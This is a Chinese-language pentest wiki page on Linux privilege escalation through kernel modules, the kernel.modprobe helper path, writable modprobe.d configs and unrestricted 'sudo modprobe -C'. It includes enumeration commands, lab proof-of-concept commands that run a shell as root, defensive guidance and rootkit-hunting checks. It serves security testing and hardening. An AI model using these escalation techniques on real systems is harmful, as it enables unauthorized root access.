# Kernel Modules and modprobe 滥用

{{#include ../../banners/hacktricks-training.md}}

## Kernel module 和模块加载配置错误

在 Linux 提权审查期间，Kernel module 支持是影响重大的领域。不要仅凭未签名模块相关消息就认定存在可利用问题，而应利用它来回答实际问题。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- 当前用户能否通过 `sudo`、capabilities 或可写的 helper 路径加载模块？
- 模块加载功能是否仍处于启用状态？
- 模块签名强制执行是否已禁用？
- module 目录、module 文件或 `modprobe.d` 配置路径是否可写？<sup>[[16]](#references)</sup>
- 能否读取 kernel 日志来确认发生了什么？

快速初步检查可从以下模块状态、签名、日志和模块树检查开始。<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretation:

- `modules_disabled=1` 表示模块既不能加载也不能卸载，并且在重启前无法将该值重置为 `0`。<sup>[[1]](#references)</sup>
- 内核命令行中的 `module.sig_enforce=1` 或 `CONFIG_MODULE_SIG_FORCE=y` 要求模块必须具有有效签名；否则，未签名模块可能会被加载，并使内核处于 taint 状态。<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` 不会限制对 `dmesg` 的访问；设为 `1` 时，访问需要 `CAP_SYSLOG`。<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` 下可写的路径很危险，因为 `modprobe` 加载模块时会搜索该目录树及其依赖数据。<sup>[[8]](#references)</sup>

### 加载模块并读取内核输出

如果你获得了加载本地模块的合法授权，`insmod` 会插入你指定的确切 `.ko` 文件。模块的 init 函数会在加载过程中运行，通过 `printk()` 写入的消息会进入内核日志缓冲区，通常使用 `dmesg` 读取。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

一个最精简的审查流程是：使用 `modinfo` 检查元数据，使用 `insmod` 和 `rmmod` 加载和移除模块，使用 `lsmod` 确认模块已加载，并使用 `dmesg` 检查内核日志。<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

如果 `sudo -l` 允许使用 `insmod`、`modprobe` 或它们的包装程序，应将其视为严重风险：`sudo -l` 会列出调用用户的权限，而加载内核模块需要 `CAP_SYS_MODULE`。有关基于 capability 的直接途径，请参阅 [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module)。<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Sudo 允许执行 `insmod`

允许用户通过 sudo 运行 `insmod` 的规则，与允许运行普通管理辅助程序不可相提并论。模块的初始化代码会在插入过程中运行，因此实际审查时要确认的是：该用户能否选择或修改要加载的模块。<sup>[[3]](#references)</sup>

以下通用审查流程会针对候选模块重复执行检查、加载、状态、日志和移除相关的检查。<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

如果用户可以提供任意 `.ko`，在授权评估中应将此规则视为系统已完全失陷。更安全的操作方式是避免通过 sudo 委派模块加载；如果无法避免，则应限制具体路径、所有权、权限、签名策略和移除流程。<sup>[[3]](#references)[[10]](#references)</sup>

在受控实验室中，以下展示了一种无害的模块构建模式，包含最精简的源码和 Makefile；`make -C /lib/modules/$(uname -r)/build M=$PWD` 形式遵循内核针对外部模块的文档化 kbuild 工作流程。<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

仅在授权实验室中构建和加载；kbuild 构建外部模块，而加载/移除命令会调用内核模块接口。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` 滥用检查

`kernel.modprobe` 指定内核在收到模块自动加载请求时执行的用户空间 helper；此 sysctl 影响自动加载，不影响显式插入模块。如果攻击者能将其修改为可写的可执行文件路径，并触发模块请求，该 helper 就会成为特权代码执行路径。将其设为空字符串会禁用自动加载请求；如果 `CONFIG_STATIC_USERMODEHELPER=y`，非空值会被编译时指定的静态 helper 路径覆盖。<sup>[[1]](#references)</sup>

通过内核 sysctl 接口检查当前 helper 路径，并检查目标文件的所有者和权限模式。<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

检查 sysctl、委派的 sudo 规则或文件 capabilities 是否可被控制。<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

以下仅限实验室的模式会更改 helper 路径并触发有文档说明的模块自动加载请求；只能在隔离且获得授权的系统上使用。<sup>[[1]](#references)</sup>

在当前 Linux 内核上，不要使用未知可执行文件作为通用触发方式：传统的自定义二进制格式模块自动加载功能已在 Linux 6.14 中移除，而内核文档指出，未知文件系统类型是一种模块自动加载请求路径。<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

在经过加固的系统上，如果权限阻止非特权用户写入 `kernel.modprobe`、辅助程序路径不可写，或模块自动加载已禁用，此操作应会失败。<sup>[[1]](#references)</sup>

### 可写的 `modprobe.d` 配置与 `sudo modprobe -C`

在解析模块之前，`modprobe` 会按优先级顺序读取配置目录中的 `.conf` 文件，例如 `/etc/modprobe.d`、`/run/modprobe.d`、`/usr/local/lib/modprobe.d`、`/usr/lib/modprobe.d` 和 `/lib/modprobe.d`。高优先级目录中的同名文件会覆盖低优先级目录中的文件。更重要的是，`install <module> <command>` 指令会运行任意 shell 命令，**而不是**插入该模块。因此，可写的配置路径可能导致命令在之后由特权 `modprobe` 调用者执行；内核模块签名强制策略不会验证此用户空间命令。<sup>[[16]](#references)</sup>

审计目录和文件权限，然后检查生效的配置。`modprobe -n -v` 可安全地用于检查解析结果，因为试运行模式既不会插入模块，也不会执行 `install`/`remove` 命令。优先使用 `modprobe -c`，而不要使用旧版 `--showconfig` 写法；当前 kmod 文档标明，该写法将在 kmod 36 之后移除。<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

即使任意 `.ko` 文件无法通过签名验证，对 `modprobe` 的不受限制的 sudo 规则仍可被利用：`-C` 可指定攻击者控制的配置目录，sudo 启动的进程可从中执行 `install` 命令。<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

为降低风险，不要通过 sudo 授予不受参数限制的 `modprobe` 权限；确保每个配置目录都由 root 所有且不可写，并检查意外的 `install`/`remove` 指令。若受信任的管理工作流必须为某个模块绕过此类指令，`modprobe --ignore-install` 会忽略该指定模块的这些指令，但依赖项仍可能有自己的命令。<sup>[[8]](#references)[[16]](#references)</sup>

### 可写的 `/lib/modules` 检查

可写的模块目录可能导致模块被替换、植入恶意模块，或遭到自动加载滥用，具体取决于之后如何调用 `modprobe`；解析模块时，`modprobe` 会搜索 `/lib/modules/$(uname -r)` 并使用其中的依赖数据。<sup>[[8]](#references)</sup>

检查当前内核版本对应模块目录树下可写的模块文件，以及依赖项/别名元数据。<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

如果发现可写的模块内容，请检查 `modprobe` 如何解析依赖项，以及 `modinfo` 如何报告模块元数据。<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

防御注意事项：

- 确保 `/lib/modules` 由 `root:root` 所有，且用户不可写入。<sup>[[8]](#references)</sup>
- 在操作上可行的情况下，于启动后设置 `kernel.modules_disabled=1`。<sup>[[1]](#references)</sup>
- 对需要可加载模块的系统强制执行模块签名。<sup>[[2]](#references)</sup>
- 监控对 `/proc/sys/kernel/modprobe`、`/lib/modules` 和 `modprobe.d` 配置目录的写入，以及意外执行的 `insmod`/`modprobe`。<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## 基于模块的 rootkit 排查

恶意模块可以 hook 系统调用、VFS 或 `/proc` 视图、网络路径或凭据检查，以隐藏进程和文件、重定向流量或截获机密信息。它还可以从 `lsmod` 显示的模块列表中移除自身。持久化机制可能包括 `modprobe.d` 别名或安装规则、`/etc/modules-load.d`、systemd 单元、initramfs 内容，或替换合法的 `.ko` 文件。正常的 `lsmod` 结果是有用的证据，但内核级入侵可能导致内核提供的列表不可信。应交叉核对已加载模块、磁盘上的文件、启动配置、模块加载日志和可信的外部遥测数据。

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

检查异常的模块名称、路径、依赖关系、签名和加载时间。Kernel taint 和 unsigned-module 消息只是线索，并非 rootkit 的确凿证据。如果怀疑存在 rootkit，应先从可信镜像或恢复环境中收集证据，再依赖实时内核输出。[kernel vulnerability assessment](kernel-vulnerability-assessment.md) 页面介绍了配置和诊断信息暴露问题，包括 tracefs 和 pinned BPF objects。

## References

- [1] [/proc/sys/kernel/ 的文档 — Linux Kernel 文档](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing facility — Linux Kernel 文档](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux 手册页](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver Basics — Linux Kernel 文档](https://docs.kernel.org/driver-api/basics.html)
- [6] [使用 printk 记录消息 — Linux Kernel 文档](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [构建外部模块 — Linux Kernel 文档](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux 手册页](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [合并标签 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
